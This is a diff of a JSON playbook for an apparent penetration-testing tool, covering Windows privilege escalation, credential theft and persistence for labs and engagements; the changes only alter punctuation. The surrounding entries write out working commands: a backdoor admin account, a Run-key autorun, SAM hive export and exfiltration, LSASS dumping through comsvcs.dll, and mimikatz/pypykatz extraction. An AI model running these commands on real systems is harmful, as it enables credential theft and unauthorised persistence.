@@ -30,7 +30,7 @@
    ],
    "priority": 94,
    "proves": "surfaces candidate local privilege-escalation avenues, the host kernel/version, and the host architecture",
-   "does_not_prove": "yields a local privilege-escalation lead only — it is not admin/root/SYSTEM until you prove that separately",
+   "does_not_prove": "yields a local privilege-escalation lead only, it is not admin/root/SYSTEM until you prove that separately",
    "report": {
     "finding": "Local Privilege Escalation Vector",
     "severity": "high"
@@ -53,14 +53,14 @@
     {
      "tool": "sh",
      "run": "cmdkey /list && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
-     "note": "Saved credentials and autologon settings — these hand you passwords more often than you might expect."
+     "note": "Saved credentials and autologon settings, these hand you passwords more often than you might expect."
     }
    ]
   },
   {
    "id": "seimpersonate",
    "title": "SeImpersonatePrivilege (Potato Family)",
-   "hypothesis": "Service identities such as IIS or MSSQL nearly always carry SeImpersonatePrivilege, which allows them to grab a SYSTEM authentication and impersonate it — that is the whole potato lineage (GodPotato on current Windows, PrintSpoofer, JuicyPotato on legacy builds). Verify the preconditions before you begin: SeImpersonate is present, the .NET version is high enough, the target is x64, and you have a writable directory to stage from.",
+   "hypothesis": "Service identities such as IIS or MSSQL nearly always carry SeImpersonatePrivilege, which allows them to grab a SYSTEM authentication and impersonate it, that is the whole potato lineage (GodPotato on current Windows, PrintSpoofer, JuicyPotato on legacy builds). Verify the preconditions before you begin: SeImpersonate is present, the .NET version is high enough, the target is x64, and you have a writable directory to stage from.",
    "tool": "godpotato",
    "tools": [
     "godpotato"
@@ -254,7 +254,7 @@
   {
    "id": "dpapi-secrets",
    "title": "DPAPI Credential Decryption",
-   "hypothesis": "Saved credentials on Windows (RDP, scheduled tasks, browsers) are encrypted under DPAPI masterkeys, and those masterkeys are in turn protected by the user's password hash. Wherever you already have the user's password (or SYSTEM), the whole credential store can be decrypted — a dependable route to lateral credentials across the 0xdf corpus.",
+   "hypothesis": "Saved credentials on Windows (RDP, scheduled tasks, browsers) are encrypted under DPAPI masterkeys, and those masterkeys are in turn protected by the user's password hash. Wherever you already have the user's password (or SYSTEM), the whole credential store can be decrypted, a dependable route to lateral credentials across the 0xdf corpus.",
    "tool": "impacket-dpapi",
    "tools": [
     "impacket-dpapi",
@@ -276,7 +276,7 @@
    ],
    "priority": 66,
    "proves": "recovers a plaintext password and candidate credentials",
-   "does_not_prove": "produces credential material only — it is not access until it successfully authenticates against a service",
+   "does_not_prove": "produces credential material only, it is not access until it successfully authenticates against a service",
    "report": {
     "finding": "Stored Credentials Recovered via DPAPI",
     "severity": "high"
@@ -330,7 +330,7 @@
    ],
    "priority": 82,
    "proves": "surfaces candidate credentials, a plaintext password, and a stored Windows credential lead",
-   "does_not_prove": "yields a local privilege-escalation lead only — it is not admin/root/SYSTEM until you prove that separately",
+   "does_not_prove": "yields a local privilege-escalation lead only, it is not admin/root/SYSTEM until you prove that separately",
    "report": {
     "finding": "Stored Credentials in Cleartext/Recoverable Form",
     "severity": "high"
@@ -352,7 +352,7 @@
     {
      "tool": "sh",
      "run": "dir /s C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml 2>nul",
-     "note": "Imaging answer files — they carry local admin passwords in cleartext. Check C:\\Windows\\Panther\\Unattend.xml as well."
+     "note": "Imaging answer files, they carry local admin passwords in cleartext. Check C:\\Windows\\Panther\\Unattend.xml as well."
     },
     {
      "tool": "sh",
@@ -362,7 +362,7 @@
     {
      "tool": "sh",
      "run": "dir %APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login* 2>nul",
-     "note": "Browser vaults are DPAPI-protected — recover them with SharpChrome, or copy Login Data plus the Local State key and crack them offline."
+     "note": "Browser vaults are DPAPI-protected, recover them with SharpChrome, or copy Login Data plus the Local State key and crack them offline."
     },
     {
      "tool": "sh",
@@ -372,14 +372,14 @@
     {
      "tool": "sh",
      "run": "reg query \"HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\" /s 2>nul",
-     "note": "WinSCP stores session passwords obfuscated (not cleartext) — flag them, then recover with a WinSCP password decoder / winscppasswd."
+     "note": "WinSCP stores session passwords obfuscated (not cleartext), flag them, then recover with a WinSCP password decoder / winscppasswd."
     }
    ]
   },
   {
    "id": "windows-old-hives",
    "title": "windows.old / Registry-Hive Secret Dump",
-   "hypothesis": "A leftover C:\\windows.old (from an in-place upgrade) or a saved SAM/SYSTEM/SECURITY hive holds old local-account hashes — often a still-valid Administrator hash you can crack or pass-the-hash. With a foothold, pull or save the hives and run secretsdump offline.",
+   "hypothesis": "A leftover C:\\windows.old (from an in-place upgrade) or a saved SAM/SYSTEM/SECURITY hive holds old local-account hashes, often a still-valid Administrator hash you can crack or pass-the-hash. With a foothold, pull or save the hives and run secretsdump offline.",
    "tool": "impacket-secretsdump",
    "tools": ["impacket-secretsdump", "reg"],
    "os": ["windows"],
@@ -389,11 +389,11 @@
    "priority": 82,
    "autonomy": "approve",
    "proves": "local-account NTLM hashes recovered from windows.old or saved registry hives (SAM + SYSTEM [+ SECURITY])",
-   "does_not_prove": "a validated login — a recovered hash must still be cracked or passed against a live service to prove access",
+   "does_not_prove": "a validated login, a recovered hash must still be cracked or passed against a live service to prove access",
    "report": {"finding": "Credential Exposure via windows.old / Backup Registry Hives", "severity": "high"},
    "refs": ["https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg"],
    "commands": [
-    {"tool": "sh", "run": "dir /a C:\\ | findstr /i windows.old & dir C:\\windows.old\\Windows\\System32\\config\\", "note": "Look for a leftover windows.old tree — the old SAM/SYSTEM/SECURITY live under ...\\Windows\\System32\\config."},
+    {"tool": "sh", "run": "dir /a C:\\ | findstr /i windows.old & dir C:\\windows.old\\Windows\\System32\\config\\", "note": "Look for a leftover windows.old tree, the old SAM/SYSTEM/SECURITY live under ...\\Windows\\System32\\config."},
     {"tool": "reg", "run": "reg save HKLM\\SAM %TEMP%\\SAM.hive & reg save HKLM\\SYSTEM %TEMP%\\SYSTEM.hive & reg save HKLM\\SECURITY %TEMP%\\SECURITY.hive", "note": "Or, once you hold the box (local admin/SYSTEM), save the LIVE hives, then exfil the three files to Kali."},
     {"tool": "impacket-secretsdump", "run": "impacket-secretsdump -sam SAM.hive -system SYSTEM.hive -security SECURITY.hive LOCAL", "note": "Parse offline on Kali. Crack or pass-the-hash the recovered Administrator hash, then paste the result on Evidence."},
     {"tool": "impacket-secretsdump", "run": "impacket-secretsdump {{domain}}/{{user}}:'{{password}}'@{{target}}", "note": "Or dump remotely when you already hold admin creds on the box."}
@@ -424,7 +424,7 @@
    ],
    "priority": 70,
    "proves": "surfaces a candidate exploit and a missing-patch privilege-escalation lead",
-   "does_not_prove": "yields a local privilege-escalation lead only — it is not admin/root/SYSTEM until you prove that separately",
+   "does_not_prove": "yields a local privilege-escalation lead only, it is not admin/root/SYSTEM until you prove that separately",
    "report": {
     "finding": "Missing Security Patches with Public Exploits",
     "severity": "high"
@@ -453,7 +453,7 @@
   {
    "id": "windows-persistence",
    "title": "Windows Persistence (Post-Admin)",
-   "hypothesis": "Once you hold admin/SYSTEM, leave yourself a route back in: a local admin account you own, a scheduled task, or a Run key. Labs seldom need it, but longer engagements do — and it makes for a report-worthy note about detection gaps. Record and remove everything you deploy.",
+   "hypothesis": "Once you hold admin/SYSTEM, leave yourself a route back in: a local admin account you own, a scheduled task, or a Run key. Labs seldom need it, but longer engagements do, and it makes for a report-worthy note about detection gaps. Record and remove everything you deploy.",
    "tool": "sh",
    "tools": [
     "sh"
@@ -470,8 +470,8 @@
     "persistence.windows"
    ],
    "priority": 50,
-   "proves": "a re-entry mechanism was planted on the host — an owned account, scheduled task, or autorun key that survives a reboot",
-   "does_not_prove": "represents persistence setup context — record it and clean it up; it is not a new privilege level",
+   "proves": "a re-entry mechanism was planted on the host, an owned account, scheduled task, or autorun key that survives a reboot",
+   "does_not_prove": "represents persistence setup context, record it and clean it up; it is not a new privilege level",
    "report": {
     "finding": "Persistence Mechanism Planted",
     "severity": "informational"
@@ -483,7 +483,7 @@
     {
      "tool": "sh",
      "run": "net user obol_supp 'Str0ng!Passw0rd' /add && net localgroup administrators obol_supp /add",
-     "note": "The textbook local-admin backdoor. Stands out in any user audit — acceptable in labs, noisy in real environments."
+     "note": "The textbook local-admin backdoor. Stands out in any user audit, acceptable in labs, noisy in real environments."
     },
     {
      "tool": "sh",
@@ -493,14 +493,14 @@
     {
      "tool": "sh",
      "run": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Windows\\Temp\\update.exe\"",
-     "note": "A Run key — it triggers at the next logon."
+     "note": "A Run key, it triggers at the next logon."
     }
    ]
   },
   {
    "id": "lsass-dump-onbox",
    "title": "On-Box LSASS Memory Dump",
-   "hypothesis": "LSASS keeps the credentials of every logged-on user in memory. With admin/SYSTEM you can dump its process using the built-in comsvcs.dll (nothing to upload) or procdump, ship the .dmp off the box, and parse it offline with pypykatz — recovering plaintext passwords, NT hashes, and Kerberos tickets for anyone signed in. This pairs well with remote secrets dumping for the times you only have a shell on the machine.",
+   "hypothesis": "LSASS keeps the credentials of every logged-on user in memory. With admin/SYSTEM you can dump its process using the built-in comsvcs.dll (nothing to upload) or procdump, ship the .dmp off the box, and parse it offline with pypykatz, recovering plaintext passwords, NT hashes, and Kerberos tickets for anyone signed in. This pairs well with remote secrets dumping for the times you only have a shell on the machine.",
    "tool": "cmd",
    "tools": [
     "cmd",
@@ -523,7 +523,7 @@
    ],
    "priority": 66,
    "proves": "recovers a plaintext password, NTLM hashes, and Kerberos tickets",
-   "does_not_prove": "produces credential material only — it is not access until it successfully authenticates against a service",
+   "does_not_prove": "produces credential material only, it is not access until it successfully authenticates against a service",
    "report": {
     "finding": "Credentials Extractable from LSASS Memory",
     "severity": "critical"
@@ -536,12 +536,12 @@
     {
      "tool": "powershell",
      "run": "Get-Process lsass",
-     "note": "Grab the LSASS PID first — comsvcs MiniDump requires it. tasklist /svc will also show it."
+     "note": "Grab the LSASS PID first, comsvcs MiniDump requires it. tasklist /svc will also show it."
     },
     {
      "tool": "cmd",
      "run": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full",
-     "note": "A built-in LOLBin dump — swap 672 for the real PID and run it from an elevated prompt. Nothing gets uploaded; comsvcs.dll MiniDump is a documented Windows capability. (Defender flags this exact string on current builds; fall back to procdump then.)"
+     "note": "A built-in LOLBin dump, swap 672 for the real PID and run it from an elevated prompt. Nothing gets uploaded; comsvcs.dll MiniDump is a documented Windows capability. (Defender flags this exact string on current builds; fall back to procdump then.)"
     },
     {
      "tool": "sh",
@@ -556,14 +556,14 @@
     {
      "tool": "pypykatz",
      "run": "pypykatz lsa minidump lsass.dmp",
-     "note": "Parse it offline on your box. Logonpasswords, NT hashes, and Kerberos tickets for every captured session — no spraying needed, just reuse. The Windows-side equivalent is mimikatz sekurlsa::minidump followed by sekurlsa::logonpasswords."
+     "note": "Parse it offline on your box. Logonpasswords, NT hashes, and Kerberos tickets for every captured session, no spraying needed, just reuse. The Windows-side equivalent is mimikatz sekurlsa::minidump followed by sekurlsa::logonpasswords."
     }
    ]
   },
   {
    "id": "defense-enum",
    "title": "Enumerate Endpoint Defenses",
-   "hypothesis": "Before running anything on the host, record which endpoint controls are active — PowerShell language mode, Microsoft Defender real-time state with its configured exclusion paths, and whether an AppLocker policy is applied. Knowing the posture up front keeps obol remote-first honest: if the box is locked down, prefer tooling that runs from Kali and stay off the host.",
+   "hypothesis": "Before running anything on the host, record which endpoint controls are active, PowerShell language mode, Microsoft Defender real-time state with its configured exclusion paths, and whether an AppLocker policy is applied. Knowing the posture up front keeps obol remote-first honest: if the box is locked down, prefer tooling that runs from Kali and stay off the host.",
    "tool": "powershell",
    "tools": [
     "powershell"
@@ -585,7 +585,7 @@
    "scope": "oscp+",
    "locus": "F",
    "proves": "the host defensive posture: PowerShell language mode, whether Defender real-time protection is on, any configured Defender exclusion paths, and whether an AppLocker policy is enforced",
-   "does_not_prove": "that any control can be evaded — this is read-only situational awareness, not an exploit; it says nothing about a way past AMSI, AppLocker, WDAC, or Defender",
+   "does_not_prove": "that any control can be evaded, this is read-only situational awareness, not an exploit; it says nothing about a way past AMSI, AppLocker, WDAC, or Defender",
    "report": {
     "finding": "Endpoint Defensive Posture",
     "severity": "informational"
@@ -608,12 +608,12 @@
     {
      "tool": "powershell",
      "run": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
-     "note": "Any folders Defender is configured to skip. Situational awareness only — recorded, not acted on."
+     "note": "Any folders Defender is configured to skip. Situational awareness only, recorded, not acted on."
     },
     {
      "tool": "powershell",
      "run": "Get-AppLockerPolicy -Effective -Xml",
-     "note": "The effective AppLocker policy, if one is applied — which rule collections are enforced."
+     "note": "The effective AppLocker policy, if one is applied, which rule collections are enforced."
     }
    ]
   }
